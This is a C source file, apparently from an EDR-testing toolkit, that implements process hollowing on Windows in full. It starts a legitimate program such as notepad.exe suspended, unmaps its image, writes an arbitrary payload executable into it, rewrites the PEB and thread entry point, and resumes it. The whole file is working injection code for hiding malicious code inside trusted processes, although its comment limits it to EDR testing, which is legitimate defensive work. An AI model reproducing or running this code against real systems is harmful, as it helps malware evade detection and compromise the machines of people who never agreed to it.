/*
 * Process Hollowing (Process Replacement)
 * 
 * This technique creates a legitimate process in suspended state,
 * unmaps its memory, and replaces it with malicious code:
 * 1. Create target process in suspended state
 * 2. Unmap the original executable from memory
 * 3. Allocate new memory in the process
 * 4. Write payload to the allocated memory
 * 5. Update process context to point to new code
 * 6. Resume the thread
 * 
 * For EDR testing purposes only.
 */

#include "../common/common.h"

typedef LONG (NTAPI *NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

/**
 * Perform process hollowing injection
 * 
 * @param targetPath Path to the legitimate executable to hollow
 * @param payloadPath Path to the payload executable
 * @return TRUE on success, FALSE on failure
 */
BOOL PerformProcessHollowing(const char* targetPath, const char* payloadPath) {
    BYTE* pPayload = NULL;
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    BOOL success = FALSE;
    PVOID pRemoteImage = NULL;
    
    si.cb = sizeof(si);
    
    // Validate target executable exists
    if (!FileExists(targetPath)) {
        LOG_ERROR("Target executable not found: %s", targetPath);
        return FALSE;
    }
    
    // Read payload file
    DWORD payloadSize = ReadFileToMemory(payloadPath, &pPayload);
    if (payloadSize == 0 || !pPayload) {
        return FALSE;
    }
    
    // Validate PE format
    if (!ValidatePEFile(pPayload, payloadSize)) {
        goto cleanup;
    }
    
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pPayload;
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pPayload + pDosHeader->e_lfanew);
    
    // Create target process in suspended state
    if (!CreateProcessA(
        targetPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        LOG_ERROR("Failed to create process. Error code: %d", GetLastError());
        goto cleanup;
    }
    LOG_SUCCESS("Target process created (PID: %d) in suspended state", pi.dwProcessId);
    
    // Get thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    CHECK_BOOL(GetThreadContext(pi.hThread, &ctx), "Failed to get thread context");
    LOG_SUCCESS("Thread context retrieved");
    
    // Get PEB address and image base
    #ifdef _WIN64
        PVOID pPeb = (PVOID)ctx.Rdx;
        PVOID pImageBase = (PVOID)((PBYTE)pPeb + 0x10);
    #else
        PVOID pPeb = (PVOID)ctx.Ebx;
        PVOID pImageBase = (PVOID)((PBYTE)pPeb + 0x8);
    #endif
    
    PVOID baseAddress = NULL;
    SIZE_T bytesRead;
    CHECK_BOOL(
        ReadProcessMemory(pi.hProcess, pImageBase, &baseAddress, sizeof(PVOID), &bytesRead),
        "Failed to read image base address"
    );
    LOG_SUCCESS("Original image base: 0x%p", baseAddress);
    
    // Unmap original executable
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtUnmapViewOfSection pNtUnmapViewOfSection = 
        (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (pNtUnmapViewOfSection && baseAddress) {
        if (pNtUnmapViewOfSection(pi.hProcess, baseAddress) == 0) {
            LOG_SUCCESS("Original image unmapped");
        } else {
            LOG_WARNING("Failed to unmap original image, continuing anyway");
        }
    }
    
    // Allocate memory for payload
    pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!pRemoteImage) {
        // Try allocating at any address if preferred address fails
        pRemoteImage = VirtualAllocEx(
            pi.hProcess,
            NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    
    CHECK_HANDLE(pRemoteImage, "Failed to allocate memory for payload");
    LOG_SUCCESS("Memory allocated at: 0x%p (%d bytes)", 
                pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);
    
    // Write PE headers
    CHECK_BOOL(
        WriteProcessMemory(pi.hProcess, pRemoteImage, pPayload, 
                          pNtHeaders->OptionalHeader.SizeOfHeaders, NULL),
        "Failed to write PE headers"
    );
    LOG_SUCCESS("PE headers written");
    
    // Write sections
    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData > 0) {
            if (WriteProcessMemory(
                pi.hProcess,
                (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),
                (PVOID)((LPBYTE)pPayload + pSectionHeader[i].PointerToRawData),
                pSectionHeader[i].SizeOfRawData,
                NULL
            )) {
                LOG_SUCCESS("Section %s written (RVA: 0x%X, Size: %d bytes)", 
                           pSectionHeader[i].Name, 
                           pSectionHeader[i].VirtualAddress,
                           pSectionHeader[i].SizeOfRawData);
            } else {
                LOG_WARNING("Failed to write section %s", pSectionHeader[i].Name);
            }
        }
    }
    
    // Update PEB with new image base
    CHECK_BOOL(
        WriteProcessMemory(pi.hProcess, pImageBase, &pRemoteImage, sizeof(PVOID), NULL),
        "Failed to update PEB image base"
    );
    LOG_SUCCESS("PEB updated with new image base");
    
    // Update entry point in context
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    #else
        ctx.Eax = (DWORD)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    #endif
    
    CHECK_BOOL(SetThreadContext(pi.hThread, &ctx), "Failed to set thread context");
    LOG_SUCCESS("Entry point updated (0x%p)", 
                (LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    
    // Resume thread
    if (ResumeThread(pi.hThread) != (DWORD)-1) {
        LOG_SUCCESS("Thread resumed - Process hollowing completed");
        success = TRUE;
    } else {
        LOG_ERROR("Failed to resume thread");
    }
    
cleanup:
    if (!success && pi.hProcess) {
        TerminateProcess(pi.hProcess, 0);
    }
    SAFE_CLOSE_HANDLE(pi.hProcess);
    SAFE_CLOSE_HANDLE(pi.hThread);
    SAFE_FREE(pPayload);
    
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage(argv[0],
                   "<target_executable> <payload_executable>",
                   "C:\\\\Windows\\\\System32\\\\notepad.exe C:\\\\payload.exe");
        return 1;
    }
    
    const char* targetPath = argv[1];
    const char* payloadPath = argv[2];
    
    LOG_INFO("Process Hollowing Technique");
    LOG_INFO("Target: %s", targetPath);
    LOG_INFO("Payload: %s", payloadPath);
    printf("\n");
    
    if (PerformProcessHollowing(targetPath, payloadPath)) {
        LOG_SUCCESS("Process hollowing succeeded");
        return 0;
    } else {
        LOG_ERROR("Process hollowing failed");
        return 1;
    }
}
